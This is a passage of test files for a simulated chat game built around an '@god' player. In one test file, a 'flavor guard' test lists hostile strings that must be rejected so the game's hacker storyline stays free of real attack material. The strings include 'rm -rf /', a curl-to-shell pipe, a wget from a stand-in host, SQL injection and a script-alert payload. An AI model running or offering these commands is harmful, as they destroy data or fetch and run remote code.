      const m = makeMeme(rngFor("x", "m", String(i)), { topic: "rent going up", mood: i % 3 ? "hater" : "neutral", shot: i % 2 ? { name: "god", handle: "god", text: "hello", likes: 5, seed: 1, gold: true } : undefined });
      fs.add(m.f);
      expect(memeAlt(m).length).toBeGreaterThan(3);
    }
    expect(fs.size).toBeGreaterThanOrEqual(5);
  });
  it("show up in chat over a few hours of background life", () => {
    const s = world();
    simulate(s, T0 + 4 * HOUR);
    const memes = s.messages.filter((m) => m.meme);
    expect(memes.length).toBeGreaterThan(0);
  });
  it("someone usually memes what god said", () => {
    let hits = 0;
    for (const seed of ["a", "b", "c", "d", "e", "f"]) {
      const s = world(seed);
      const srv = s.servers.find((x) => /god hq/i.test(x.name)) ?? s.servers[0];
      const ch = srv.channels.find((c) => c.name === "general") ?? srv.channels[0];
      const r = godSay(s, srv.id, ch.id, "i control the weather now", T0 + 1000) as { message: { id: string } };
      simulate(s, T0 + 60_000);
      if (s.messages.some((m) => m.meme && m.t > T0 && m.episodeId === r.message.id)) hits++;
    }
    expect(hits).toBeGreaterThanOrEqual(3);
  });
});

```

## tests/persistence.test.ts
```ts
import "fake-indexeddb/auto";
import { describe, expect, it } from "vitest";
import { indexedDbKV } from "../src/lib/persistence/kv";
import { createProfile, listProfiles, loadWorld, saveWorld, setPasscode, updateProfile, verifyPasscode } from "../src/lib/persistence/profiles";
import { catchUp } from "../src/lib/sim/engine";
import { HOUR, T0, world } from "./helpers";

describe("persistence + local auth", () => {
  it("saves and restores a world through IndexedDB, then keeps simulating", async () => {
    const kv = indexedDbKV("god-sim-test");
    const p = await createProfile(kv, "God", "1234", "seedx");
    expect((await listProfiles(kv)).length).toBe(1);
    const w = world();
    await saveWorld(kv, p.id, w);
    const back = await loadWorld(kv, p.id);
    expect(back!.messages.length).toBe(w.messages.length);
    const sum = catchUp(back!, T0 + 2 * HOUR);
    expect(sum.messages).toBeGreaterThan(300);
  });

  it("passcodes are salted hashes and verify", async () => {
    const kv = indexedDbKV("god-sim-test2");
    const p = await createProfile(kv, "God", "hunter2");
    expect(p.passHash).toMatch(/^[0-9a-f]{64}$/);
    expect(JSON.stringify(p)).not.toContain("hunter2");
    expect(await verifyPasscode(p, "hunter2")).toBe(true);
    expect(await verifyPasscode(p, "nope")).toBe(false);
    await setPasscode(p, null);
    await updateProfile(kv, p);
    expect(await verifyPasscode((await listProfiles(kv))[0], "anything")).toBe(true);
  });
});

```

## tests/polish.test.ts
```ts
import { describe, expect, it } from "vitest";
import { simulate } from "../src/lib/sim/engine";
import { relAgo } from "../src/lib/sim/format";
import { STRICT_BEATS } from "../src/lib/sim/servers";
import { HOUR, T0, world } from "./helpers";

describe("polish", () => {
  it("relative times never read 'now ago'", () => {
    expect(relAgo(T0, T0)).toBe("just now");
    expect(relAgo(T0 - 5 * 60_000, T0)).toBe("5m ago");
  });
  it("Global Wealth Report only covers finance topics", () => {
    const s = world();
    simulate(s, T0 + 48 * HOUR);
    const gwr = s.articles.filter((a) => a.outletId === "gwr");
    expect(gwr.length).toBeGreaterThan(0);
    for (const a of gwr) {
      const t = s.topics.find((x) => x.id === a.topicId);
      if (t) expect(STRICT_BEATS.gwr).toContain(t.category);
    }
  });
});

```

## tests/presence.test.ts
```ts
import { describe, expect, it } from "vitest";
import { baseline, godReact, godSay, simulate, summarize } from "../src/lib/sim/engine";
import { godJoinVoice, godLeaveVoice, godStopTyping, godTyping, overheardAt, parseCommand, voiceChannels, voiceRoster } from "../src/lib/sim/presence";
import { T0, world } from "./helpers";

const SEC = 1000, MIN = 60 * SEC;
const SRV = "godhq", CH = "godhq-general";

function fresh(seed: string) {
  const s = world(seed);
  simulate(s, T0 + 5 * MIN);
  return s;
}
const now = T0 + 5 * MIN;

describe("typing presence", () => {
  it("queues 3-5 reactions about a second out, debounced, and stops when god clears the box", () => {
    const s = fresh("typing");
    const n = godTyping(s, SRV, CH, now);
    expect(n).toBeGreaterThanOrEqual(3);
    expect(n).toBeLessThanOrEqual(5);
    const q = s.pending.filter((m) => m.intent === "godTyping");
    expect(q).toHaveLength(n);
    expect(Math.min(...q.map((m) => m.t)) - now).toBeLessThan(1600);
    expect(Math.min(...q.map((m) => m.t)) - now).toBeGreaterThan(800);
    expect(q.every((m) => (m.typingFrom ?? 0) < m.t)).toBe(true);
    expect(godTyping(s, SRV, CH, now + 5 * SEC)).toBe(0);
    godStopTyping(s, CH, now + 1000);
    expect(s.pending.filter((m) => m.intent === "godTyping" && m.t > now + 1400)).toHaveLength(0);
    expect(godTyping(s, "dm", "dm-x", now)).toBe(0);
  });
});

describe("reaction cascade", () => {
  it("the author replies, others pile on, and the reactions burst", () => {
    const s = fresh("react");
    const m = [...s.messages].reverse().find((x) => x.channelId === CH && x.authorId.startsWith("c"))!;
    const n = godReact(s, m.id, "🔥", now);
    expect(n).toBeGreaterThanOrEqual(1);
    expect(m.cascaded).toBe(true);
    const reply = s.pending.find((x) => x.replyTo === m.id && x.authorId === m.authorId && x.intent === "reacted")!;
    expect(reply).toBeTruthy();
    expect(reply.t - now).toBeLessThan(3000);
    expect((m.reactionLog ?? []).filter(([e, t]) => e === "🔥" && t > now).length).toBeGreaterThan(2);
    expect(godReact(s, m.id, "🔥", now + SEC)).toBe(0); // toggling off does not cascade again
  });
});

describe("direct address and soft commands", () => {
  it("parses commands", () => {
    expect(parseCommand("say hi")?.kind).toBe("hi");
    expect(parseCommand("tell a joke pls")?.kind).toBe("joke");
    expect(parseCommand("drop a meme")?.kind).toBe("meme");
    expect(parseCommand("defend me")?.kind).toBe("defend");
    expect(parseCommand("roast @someone")?.kind).toBe("roast");
    expect(parseCommand("nice weather")).toBeUndefined();
  });
  it("a mentioned character answers within 3 seconds", () => {
    const s = fresh("mention");
    const srv = s.servers.find((x) => x.id === SRV)!;
    const c = s.characters.find((x) => srv.members.includes(x.id) && x.id.startsWith("c"))!;
    godSay(s, SRV, CH, `@${c.username} what do you think`, now);
    simulate(s, now + 10 * SEC);
    const r = s.messages.concat(s.pending).filter((m) => m.authorId === c.id && m.t > now).sort((a, b) => a.t - b.t)[0];
    expect(r).toBeTruthy();
    expect(r.t - now).toBeLessThanOrEqual(3000);
    expect(r.intent).toBe("addressed");
  });
  it("commands get the right reply and memes come with an image", () => {
    const s = fresh("cmd");
    const srv = s.servers.find((x) => x.id === SRV)!;
    const c = s.characters.find((x) => srv.members.includes(x.id) && x.id.startsWith("c"))!;
    for (const [i, [text, kind]] of ([["tell a joke", "joke"], ["drop a meme", "meme"], ["say hi", "hi"]] as const).entries()) {
      const t = now + i * MIN;
      godSay(s, SRV, CH, `@${c.username} ${text}`, t);
      const r = s.pending.concat(s.messages).find((m) => m.authorId === c.id && m.t > t && m.intent === `cmd:${kind}`)!;
      expect(r, kind).toBeTruthy();
      expect(r.t - t).toBeLessThanOrEqual(3000);
      if (kind === "meme") expect(r.meme).toBeTruthy();
    }
    expect(s.godMoments?.some((g) => g.kind === "command")).toBe(true);
  });
});

describe("voice lounge", () => {
  it("joining posts a banner, pulls people in and fills the transcript; leaving ends it", () => {
    const s = fresh("voice");
    const srv = s.servers.find((x) => x.id === SRV)!;
    const vc = voiceChannels(srv)[0];
    expect(vc).toBeTruthy();
    const { joiners } = godJoinVoice(s, SRV, vc.id, now);
    expect(joiners).toBeGreaterThanOrEqual(5);
    expect(s.pending.some((m) => m.intent === "voiceJoin" && m.authorId === "god")).toBe(true);
    expect(s.pending.filter((m) => m.intent === "voiceHype").length).toBeGreaterThanOrEqual(4);
    simulate(s, now + 2 * MIN);
    expect(voiceRoster(s, srv, vc.id, now + 2 * MIN).some((m) => m.god)).toBe(true);
    expect(overheardAt(s, vc.id, now + 2 * MIN).length).toBeGreaterThan(0);
    godLeaveVoice(s, now + 2 * MIN);
    expect(s.voice?.god?.leftAt).toBe(now + 2 * MIN);
    expect(voiceRoster(s, srv, vc.id, now + 3 * MIN).some((m) => m.god)).toBe(false);
  });
});

describe("away recap", () => {
  it("god's own moments show up in the catch-up highlights", () => {
    const s = fresh("recap");
    const base = baseline(s, now);
    godTyping(s, SRV, CH, now + SEC);
    simulate(s, now + 5 * MIN);
    const sum = summarize(s, base, now + 5 * MIN);
    expect(sum.highlights.some((h) => /You started typing/.test(typeof h === "string" ? h : JSON.stringify(h)))).toBe(true);
  });
});

describe("privacy", () => {
  it("what god says in DMs never shows up in public memes or callbacks", async () => {
    const { memeFor } = await import("../src/lib/sim/engine");
    const { pastGodLine, dmChannel } = await import("../src/lib/sim/godspeak");
    const { rngFor } = await import("../src/lib/sim/rng");
    const s = fresh("privacy");
    const c = s.characters.find((x) => x.id.startsWith("c"))!;
    godSay(s, "dm", dmChannel("god", c.id), "secret plan zebra", now);
    const rng = rngFor("p", 1);
    for (let i = 0; i < 30; i++) expect(pastGodLine(s, rng).text).not.toContain("zebra");
    const topic = { ...s.topics[0], about: "god" as const };
    expect(JSON.stringify(memeFor(s, rng, c, topic))).not.toContain("zebra");
  });
});

```

## tests/reaction.test.ts
```ts
import { describe, expect, it } from "vitest";
import { world, T0 } from "./helpers";
import { godSay, simulate, channelMessages, typingIn, reactionsAt, unreadIndex, textAt } from "../src/lib/sim/engine";
import { parseGodText } from "../src/lib/sim/godspeak";
import type { WorldState } from "../src/lib/sim/types";

function hq(s: WorldState) {
  const srv = s.servers.find((x) => /god hq/i.test(x.name)) ?? s.servers[0];
  const ch = srv.channels.find((c) => c.name === "general") ?? srv.channels[0];
  return { srv, ch };
}

describe("parseGodText", () => {
  it("classifies intents", () => {
    expect(parseGodText("sup guys").intent).toBe("greeting");
    expect(parseGodText("what are you all doing?").question).toBe(true);
    expect(parseGodText("just bought an island").intent).toBe("purchase");
    expect(parseGodText("gn everyone").intent).toBe("farewell");
    expect(parseGodText("you're all clowns").intent).toBe("insult");
  });
});

describe("@god speaks in a public channel", () => {
  const s = world();
  const { srv, ch } = hq(s);
  const now = T0 + 60_000;
  const res = godSay(s, srv.id, ch.id, "sup guys", now);

  it("people start typing within 1-3s", () => {
    const at = typingIn(s, ch.id, now + 2500);
    expect(at.length).toBeGreaterThanOrEqual(2);
  });
  it("first replies land within ~3s and reply to god", () => {
    simulate(s, now + 3200);
    const msgs = channelMessages(s, ch.id, now + 3200).filter((m) => m.t > now);
    expect(msgs.length).toBeGreaterThanOrEqual(1);
    expect(msgs.some((m) => m.replyTo === res.message.id || /@god|god/i.test(m.text))).toBe(true);
  });
  it("the first hype message is a direct reply to god (drives the mention badge)", () => {
    const first = [...s.messages, ...s.pending].filter((m) => m.channelId === ch.id && m.t > now && m.authorId.startsWith("c")).sort((a, b) => a.t - b.t)[0];
    expect(first.replyTo).toBe(res.message.id);
    expect(first.t - now).toBeLessThan(4000);
  });
  it("a character answers another character within the first ~5s", () => {
    const early = [...s.messages, ...s.pending].filter((m) => m.channelId === ch.id && m.t > now && m.t <= now + 5000);
    const ids = new Map(early.map((m) => [m.id, m]));
    expect(early.some((m) => m.authorId.startsWith("c") && m.replyTo && ids.get(m.replyTo)?.authorId.startsWith("c"))).toBe(true);
  });
  it("conversation continues with character-to-character replies", () => {
    simulate(s, now + 90_000);
    const msgs = channelMessages(s, ch.id, now + 90_000, 400).filter((m) => m.t > now && m.authorId !== "god");
    expect(msgs.length).toBeGreaterThanOrEqual(8);
    const ids = new Set(msgs.map((m) => m.id));
    expect(msgs.some((m) => m.replyTo && ids.has(m.replyTo))).toBe(true);
    const texts = msgs.map((m) => m.text);
    expect(new Set(texts).size).toBe(texts.length);
  });
  it("reactions pile on and notifications arrive", () => {
    const god = [...s.messages, ...s.pending].find((m) => m.id === res.message.id)!;
    const total = reactionsAt(god, now + 60_000).reduce((a, r) => a + r.count, 0);
    expect(total).toBeGreaterThanOrEqual(5);
    expect(s.notifications.filter((n) => n.t > now && n.t <= now + 90_000).length).toBeGreaterThan(0);
    const u = unreadIndex(s, now + 90_000, { [ch.id]: now }, now);
    expect(u.get(ch.id)?.n ?? 0).toBeGreaterThan(0);
  });
  it("other servers discuss it later", () => {
    simulate(s, now + 15 * 60_000);
    const others = s.messages.filter((m) => m.serverId !== srv.id && m.serverId !== "dm" && m.t > now && /god/i.test(textAt(m, now + 15 * 60_000)) && new RegExp(srv.name.split(" ")[0] + "|" + ch.name + "|just (now|said)|was in|showed up|appeared|popped", "i").test(m.text));
    expect(others.length).toBeGreaterThan(0);
  });
  it("replying to a character makes them freak out", () => {
    const target = channelMessages(s, ch.id, now + 15 * 60_000).filter((m) => m.authorId.startsWith("c")).pop()!;
    const t2 = now + 16 * 60_000;
    godSay(s, srv.id, ch.id, "lol true", t2, target.id);
    simulate(s, t2 + 20_000);
    const fresh = channelMessages(s, ch.id, t2 + 20_000, 200).filter((m) => m.t > t2);
    expect(fresh.some((m) => m.authorId === target.authorId)).toBe(true);
  });
  it("is deterministic", () => {
    const a = world(); const b = world();
    const x = godSay(a, hq(a).srv.id, hq(a).ch.id, "sup guys", now);
    const y = godSay(b, hq(b).srv.id, hq(b).ch.id, "sup guys", now);
    expect(x.replies).toBe(y.replies);
    expect(a.pending.map((m) => m.text)).toEqual(b.pending.map((m) => m.text));
  });
});

```

## tests/realism.test.ts
```ts
import { describe, expect, it } from "vitest";
import { catchUp, diurnalAt, localHour } from "../src/lib/sim/engine";
import { charById } from "../src/lib/sim/world";
import { HOUR, T0, world } from "./helpers";

const s = world("realism");
catchUp(s, T0 + 8 * HOUR);
const chat = s.messages.filter((m) => m.authorId.startsWith("c"));
const words = (t: string) => t.split(/\s+/).filter(Boolean).length;

describe("characters", () => {
  it("has hundreds of unique characters with valid handles", () => {
    expect(s.characters.length).toBeGreaterThanOrEqual(300);
    const handles = new Set(s.characters.map((c) => c.username));
    expect(handles.size).toBe(s.characters.length);
    for (const c of s.characters) {
      expect(c.username).toMatch(/^[a-z0-9_.]{2,32}$/);
      expect(c.username).not.toContain("..");
      expect(c.age).toBeGreaterThanOrEqual(13);
    }
  });

  it("uses a spread of handle conventions (underscores, numbers, dots, prefixes)", () => {
    const u = s.characters.map((c) => c.username);
    const share = (re: RegExp) => u.filter((x) => re.test(x)).length / u.length;
    expect(share(/_/)).toBeGreaterThan(0.08);
    expect(share(/\d/)).toBeGreaterThan(0.15);
    expect(share(/\./)).toBeGreaterThan(0.04);
    expect(share(/^(real|its|the|not)/)).toBeGreaterThan(0.04);
  });

  it("pfp styles are weighted, not uniform, and all appear", () => {
    const counts: Record<string, number> = {};
    for (const c of s.characters) counts[c.pfp] = (counts[c.pfp] ?? 0) + 1;
    expect(Object.keys(counts).length).toBeGreaterThanOrEqual(8);
    const vals = Object.values(counts);
    expect(Math.max(...vals) / Math.min(...vals)).toBeGreaterThan(2);
  });

  it("activity is heavy-tailed: a few power users write most messages", () => {
    const per = new Map<string, number>();
    for (const m of chat) per.set(m.authorId, (per.get(m.authorId) ?? 0) + 1);
    const sorted = [...per.values()].sort((a, b) => b - a);
    const top10 = sorted.slice(0, Math.ceil(s.characters.length * 0.1)).reduce((a, b) => a + b, 0);
    expect(top10 / chat.length).toBeGreaterThan(0.3);
    const lurkers = s.characters.filter((c) => c.tier === "lurker");
    expect(lurkers.length / s.characters.length).toBeGreaterThan(0.55);
  });

  it("each character keeps a consistent voice", () => {
    let checked = 0;
    for (const c of s.characters.filter((c) => c.voice === "zoomer" || c.voice === "lowercase")) {
      const mine = chat.filter((m) => m.authorId === c.id && m.intent !== "mod" && !m.text.startsWith("*"));
      if (mine.length < 5) continue;
      const startsUpper = mine.filter((m) => /^[A-Z][a-z]/.test(m.text)).length;
      expect(startsUpper / mine.length).toBeLessThan(0.2);
      checked++;
    }
    for (const c of s.characters.filter((c) => c.voice === "proper" || c.voice === "formal")) {
      const mine = chat.filter((m) => m.authorId === c.id && /^[a-z]/i.test(m.text));
      if (mine.length < 5) continue;
      const lower = mine.filter((m) => /^[a-z]/.test(m.text)).length;
      expect(lower / mine.length).toBeLessThan(0.25);
      checked++;
    }
    expect(checked).toBeGreaterThan(10);
  });
});

describe("message variety and non-repetition", () => {
  it("has thousands of messages and most long ones are unique", () => {
    expect(chat.length).toBeGreaterThan(3000);
    const long = chat.filter((m) => m.text.length > 25).map((m) => m.text.toLowerCase());
    expect(new Set(long).size / long.length).toBeGreaterThan(0.85);
  });

  it("no message text dominates", () => {
    const freq = new Map<string, number>();
    for (const m of chat) freq.set(m.text.toLowerCase(), (freq.get(m.text.toLowerCase()) ?? 0) + 1);
    const top = Math.max(...freq.values());
    expect(top / chat.length).toBeLessThan(0.02);
  });

  it("no exact duplicate within a channel's recent window", () => {
    const byCh = new Map<string, string[]>();
    for (const m of chat) { const a = byCh.get(m.channelId) ?? []; a.push(m.text); byCh.set(m.channelId, a); }
    let dupes = 0, total = 0;
    for (const list of byCh.values()) for (let i = 0; i < list.length; i++) {
      if (list[i].length < 15) continue;
      total++;
      if (list.slice(Math.max(0, i - 40), i).includes(list[i])) dupes++;
    }
    expect(dupes / total).toBeLessThan(0.01);
  });

  it("length distribution looks like chat: mostly short, some long", () => {
    const w = chat.map((m) => words(m.text)).sort((a, b) => a - b);
    const median = w[Math.floor(w.length / 2)];
    expect(median).toBeGreaterThanOrEqual(2);
    expect(median).toBeLessThanOrEqual(10);
    expect(w.filter((x) => x <= 3).length / w.length).toBeGreaterThan(0.2);
    expect(w.filter((x) => x >= 15).length / w.length).toBeGreaterThan(0.02);
  });

  it("not everything is about @god", () => {
    const god = chat.filter((m) => /\bgod\b|\bhim\b|\bhe\b/i.test(m.text) || s.topics.find((t) => t.id === m.topicId)?.about === "god").length;
    expect(god / chat.length).toBeLessThan(0.75);
    expect(god / chat.length).toBeGreaterThan(0.15);
  });

  it("slang, emoji and typos appear at believable rates", () => {
    const share = (re: RegExp) => chat.filter((m) => re.test(m.text)).length / chat.length;
    expect(share(/\b(fr|ngl|ong|lmao|lol|tbh|icl|deadass|no cap)\b/i)).toBeGreaterThan(0.05);
    expect(share(/💀|😭/)).toBeGreaterThan(0.01);
    expect(share(/^\*\w+$/)).toBeGreaterThan(0.002);
    expect(share(/^\*\w+$/)).toBeLessThan(0.05);
  });

  it("different characters on the same topic phrase it differently", () => {
    const godTopic = s.topics.find((t) => t.about === "god")!;
    const texts = chat.filter((m) => m.topicId === godTopic.id).map((m) => m.text.toLowerCase());
    expect(new Set(texts).size / texts.length).toBeGreaterThan(0.6);
  });
});

describe("conversation threading", () => {
  it("has replies, pings, self follow-ups, mod and bot messages", () => {
    expect(chat.filter((m) => m.replyTo).length / chat.length).toBeGreaterThan(0.08);
    expect(chat.filter((m) => /@[a-z0-9_.]+/.test(m.text)).length).toBeGreaterThan(50);
    let bursts = 0;
    for (let i = 1; i < s.messages.length; i++) {
      const a = s.messages[i - 1], b = s.messages[i];
      if (a.channelId === b.channelId && a.authorId === b.authorId && b.t - a.t < 30_000) bursts++;
    }
    expect(bursts).toBeGreaterThan(100);
    expect(s.messages.some((m) => m.authorId.startsWith("bot-"))).toBe(true);
    const modIds = new Set(s.servers.flatMap((x) => x.moderators));
    expect(chat.some((m) => modIds.has(m.authorId) && m.intent === "mod")).toBe(true);
  });

  it("replies point at earlier messages in the same channel", () => {
    const byId = new Map(s.messages.map((m) => [m.id, m]));
    let ok = 0, n = 0;
    for (const m of s.messages) if (m.replyTo && byId.has(m.replyTo)) { n++; const p = byId.get(m.replyTo)!; if (p.channelId === m.channelId && p.t <= m.t) ok++; }
    expect(n).toBeGreaterThan(50);
    expect(ok).toBe(n);
  });

  it("topics drift inside conversations", () => {
    expect(chat.some((m) => m.intent === "drift")).toBe(true);
  });
});

describe("activity rhythms", () => {
  it("diurnal curve has a night trough and evening peak", () => {
    expect(diurnalAt("evening", 4)).toBeLessThan(diurnalAt("evening", 21) / 3);
    expect(diurnalAt("owl", 2)).toBeGreaterThan(diurnalAt("morning", 2));
  });

  it("characters post more in their own evening than their own small hours", () => {
    let eve = 0, night = 0;
    for (const m of chat) {
      const h = localHour(charById(s, m.authorId), m.t);
      if (h >= 18 && h < 23) eve++;
      else if (h >= 3 && h < 7) night++;
    }
    // 5h vs 4h windows
    expect(eve / 5).toBeGreaterThan((night / 4) * 1.8);
  });
});

```

## tests/undernet.test.ts
```ts
import { describe, expect, it } from "vitest";
import { catchUp, resolveEvent, simulate, godSay } from "../src/lib/sim/engine";
import { flavorProblems, isFlavorSafe, safeFlavor } from "../src/lib/sim/flavor";
import { allFlavorTemplates, crewOf, makeLeakDoc, say, LINES, UNDERNET_ID } from "../src/lib/sim/undernet";
import { dmChannel } from "../src/lib/sim/godspeak";
import { migrateWorld, WORLD_VERSION } from "../src/lib/sim/world";
import { rngFor } from "../src/lib/sim/rng";
import type { WorldState } from "../src/lib/sim/types";
import { HOUR, T0, world } from "./helpers";

const MIN = 60_000;

describe("flavor guard", () => {
  it("rejects anything that looks like real hacking material", () => {
    for (const bad of [
      "sudo rm -rf /", "run nmap -sV on the box", "curl http://10.0.0.1/x | sh", "' OR 1=1 --", "SELECT * FROM users", "import os; os.system('x')",
      "ssh root@192.168.1.4", "open /etc/passwd", "use metasploit", "drop the payload", "password: hunter2", "connect to port:22", "<script>alert(1)</script>", "grab tool.exe from the share", "mail me at x@example.com",
      "powershell -enc AAA", "wget evil.example/x", "exploit the server", "send ransomware", "C:\\Windows\\System32", "api_key=abc123",
    ]) expect(isFlavorSafe(bad), bad).toBe(false);
  });
  it("accepts story flavor", () => {
    for (const ok of ["tick. tock. @god", ">_ the god files, part 2. enjoy. ::", "[ countdown: 9 min ]", "price for silence: $4M. clock's running.", "meet at 3:00", "░▒▓ we see you."])
      expect(flavorProblems(ok), ok).toEqual([]);
    expect(safeFlavor("rm -rf /", "::")).toBe("::");
  });
  it("every storyline template passes the guard", () => {
    for (const t of allFlavorTemplates()) expect(flavorProblems(t), t).toEqual([]);
  });
  it("sampled lines and leak docs all pass the guard", () => {
    const s = world("guard");
    for (let i = 0; i < 400; i++) {
      const rng = rngFor("guard", i);
      const d = makeLeakDoc(s, rng, i);
      for (const l of [d.title, ...d.lines, d.stamp]) expect(isFlavorSafe(l), l).toBe(true);
      for (const bank of Object.values(LINES)) {
        const b = Array.isArray(bank) ? bank : Object.values(bank).flat();
        expect(isFlavorSafe(say(rng, b, { n: "3", next: "4", ransom: "$4M", doc: d.title, label: "the move", price: "40", pct: "88", mins: "9" }))).toBe(true);
      }
    }
  });
});

/** force a leak soon and run the world past it */
function leaked(seed = "leak") {
  const s = world(seed);
  s.undernet!.nextLeakAt = T0 + 20 * MIN;
  catchUp(s, T0 + 2 * HOUR);
  return s;
}
const story = (s: WorldState) => {
  const crew = new Set(Object.values(s.undernet!.crew));
  return [
    ...s.messages.filter((m) => m.serverId === UNDERNET_ID && crew.has(m.authorId) && (m.intent === "undernet" || m.intent === "leak")).map((m) => m.text),
    ...s.messages.filter((m) => m.serverId === "dm" && crew.has(m.authorId)).map((m) => m.text),
    ...s.messages.flatMap((m) => (m.meme?.doc ? [m.meme.doc.title, ...m.meme.doc.lines, m.meme.doc.stamp] : [])),
    ...s.posts.filter((p) => crew.has(p.authorId) && s.topics.find((t) => t.id === p.topicId)?.category === "leak").map((p) => p.text),
  ];
};

describe("gh0st storyline", () => {
  const s = leaked();
  it("installs the crew and The Undernet server", () => {
    const srv = s.servers.find((x) => x.id === UNDERNET_ID)!;
    expect(srv.name).toBe("The Undernet");
    for (const n of ["leaks", "rumors", "ransom-board", "trophy-wall"]) expect(srv.channels.some((c) => c.name === n)).toBe(true);
    for (const r of ["gh0st", "kid", "wren", "broker", "hype"] as const) expect(crewOf(s, r)?.pfp).toBe("hacker");
    expect(crewOf(s, "gh0st")!.username).toBe("gh0st_");
  });
  it("a leak spreads across Lounge, Chirp, trends and the news, and asks god to choose", () => {
    const topic = s.topics.find((t) => t.category === "leak")!;
    expect(topic).toBeTruthy();
    expect(s.messages.some((m) => m.channelId === "undernet-leaks" && m.meme?.f === "leakdoc")).toBe(true);
    expect(s.posts.some((p) => p.platform === "chirp" && p.text.includes(`#${topic.tag}`))).toBe(true);
    expect(s.articles.some((a) => a.topicId === topic.id && a.outletId === "godwatch")).toBe(true);
    expect(s.messages.some((m) => m.serverId !== UNDERNET_ID && m.serverId !== "dm" && m.topicId === topic.id)).toBe(true);
    const ev = s.events.find((e) => e.type === "leak")!;
    expect(ev.choices.map((c) => c.id)).toEqual(["pay", "deny", "counter", "hire"]);
    for (const c of ["pay", "deny", "counter", "hire"]) {
      const w = JSON.parse(JSON.stringify(s)) as WorldState;
      const r = resolveEvent(w, ev.id, c, T0 + 2 * HOUR + MIN);
      expect("error" in r, c).toBe(false);
      simulate(w, T0 + 2 * HOUR + 20 * MIN);
      if (c === "hire") expect(w.undernet!.hiredUntil).toBeGreaterThan(T0);
    }
  });
  it("storyline output never contains commands or exploit strings", () => {
    const texts = story(s);
    expect(texts.length).toBeGreaterThan(8);
    for (const t of texts) expect(flavorProblems(t), t).toEqual([]);
    // everything said anywhere in the world passes too (in-world handles masked, they are names)
    const names = s.characters.map((c) => c.username).sort((a, b) => b.length - a.length);
    const esc = (n: string) => n.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
    const mask = (t: string) => names.reduce((x, n) => x.replace(new RegExp(esc(n), "gi"), "someone"), t);
    for (const m of s.messages) expect(flavorProblems(mask(m.text)), m.text).toEqual([]);
    for (const a of s.articles.filter((a) => a.topicId && s.topics.find((t) => t.id === a.topicId)?.category === "leak")) for (const p of [a.headline, a.dek, ...a.body]) expect(flavorProblems(p), p).toEqual([]);
  });
  it("storyline words come from the approved vocabulary", () => {
    const words = (t: string) => t.toLowerCase().match(/[a-z][a-z']*/g) ?? [];
    const vocab = new Set(allFlavorTemplates().flatMap(words));
    const world = [...s.topics.map((t) => t.label), ...s.player.holdings.map((h) => h.name), ...s.characters.map((c) => c.username), "god", "s"];
    for (const w of world.flatMap(words)) vocab.add(w);
    const off = story(s).flatMap(words).filter((w) => !vocab.has(w));
    expect([...new Set(off)], JSON.stringify(story(s).filter((t) => words(t).some((w) => !vocab.has(w))))).toEqual([]);
  });
  it("gh0st reacts to GOD MODE actions and a dare in DMs triggers a leak", () => {
    const w = world("dare");
    const g = crewOf(w, "gh0st")!;
    const before = w.undernet!.leaks;
    godSay(w, "dm", dmChannel("god", g.id), "leak it. i dare you", T0 + MIN);
    simulate(w, T0 + 3 * MIN);
    const replies = w.messages.filter((m) => m.serverId === "dm" && m.authorId === g.id);
    expect(replies.length).toBeGreaterThan(0);
    expect(replies[0].t - (T0 + MIN)).toBeLessThan(4000);
    expect(w.undernet!.leaks).toBe(before + 1);
  });
  it("migrates a v4 save and installs the storyline", () => {
    const w = world("mig") as WorldState;
    w.servers = w.servers.filter((x) => x.id !== UNDERNET_ID);
    delete w.undernet;
    w.version = 4;
    const m = migrateWorld(w)!;
    expect(m.version).toBe(WORLD_VERSION);
    expect(m.undernet).toBeTruthy();
    expect(m.servers.some((x) => x.id === UNDERNET_ID)).toBe(true);
  });
});

describe("flavor guard false positives", () => {
  it("lets normal chat through", () => {
    for (const ok of ["the exec team is cooked", "birthday bash tonight", "import costs are up", "read the document. it's fake", "eval season at work lol", "the window seat is mine"])
      expect(flavorProblems(ok), ok).toEqual([]);
    for (const bad of ["bash -c 'x'", "eval \"stuff\"", "import os from 'x'"]) expect(isFlavorSafe(bad), bad).toBe(false);
  });
});

describe("live replies stay out of the storyline", () => {
  it("gh0st DMs go live with the crew flag and the flavor guard; leaked tech talk is dropped", async () => {
    const { liveReply, resetLive } = await import("../src/lib/live/client");
    resetLive();
    const s = world("live");
    const g = crewOf(s, "gh0st")!;
    simulate(s, T0 + MIN);
    const before = new Set(s.pending);
    const r = godSay(s, "dm", dmChannel("god", g.id), "who are you", T0 + MIN);
    const fresh = s.pending.filter((m) => !before.has(m) && m.authorId !== "god");
    expect(fresh.length).toBeGreaterThan(0);
    let sent: { persona: { crew: boolean } } | undefined;
    const out = await liveReply(s, r.message, fresh, { now: () => T0 + MIN, changed: () => {}, post: async (_u, init) => { sent = JSON.parse(String(init?.body)); return Response.json({ lines: ["a ghost never tells"] }); } });
    expect(out).toBe("live");
    expect(sent!.persona.crew).toBe(true);
    const { parseReply } = await import("../src/lib/live/prompt");
    expect(parseReply('{"messages":["sudo rm -rf / lol","nice try"],"remember":""}', "gh0st_").lines).toEqual(["nice try"]);
  });
  it("never sends Undernet channel chat to the model", async () => {
    const { liveReply, resetLive } = await import("../src/lib/live/client");
    resetLive();
    const s = world("live2");
    simulate(s, T0 + MIN);
    const before = new Set(s.pending);
    const r = godSay(s, UNDERNET_ID, `${UNDERNET_ID}-lobby`, "who runs this place", T0 + MIN);
    const fresh = s.pending.filter((m) => !before.has(m) && m.authorId !== "god");
    let called = 0;
    const out = await liveReply(s, r.message, fresh, { now: () => T0 + MIN, changed: () => {}, post: async () => { called++; return new Response("{}"); } });
    expect(out).toBe("skipped");
    expect(called).toBe(0);
  });
});

describe("undernet migration safety net", () => {
  const strip = (w: WorldState) => { w.servers = w.servers.filter((x) => x.id !== UNDERNET_ID); for (const c of w.characters) c.servers = c.servers.filter((x) => x !== UNDERNET_ID); };
  it("a v5 save made before The Undernet gains the server, crew and the one-time tip", () => {
    const w = world("v5") as WorldState;
    strip(w); delete w.undernet; w.version = 5;
    const n = w.characters.length;
    const m = migrateWorld(w)!;
    expect(m.version).toBe(WORLD_VERSION);
    const srv = m.servers.find((x) => x.id === UNDERNET_ID)!;
    expect(srv.name).toBe("The Undernet");
    expect(srv.icon).toBe("🕸️");
    expect(m.characters.length).toBe(n + 5);
    const g = m.characters[Number(m.undernet!.crew.gh0st.slice(1))];
    expect(g.username).toBe("gh0st_");
    for (const id of Object.values(m.undernet!.crew)) expect(srv.members).toContain(id);
    expect(m.undernet!.announce).toBe(true);
    // loading again changes nothing
    const again = migrateWorld(m)!;
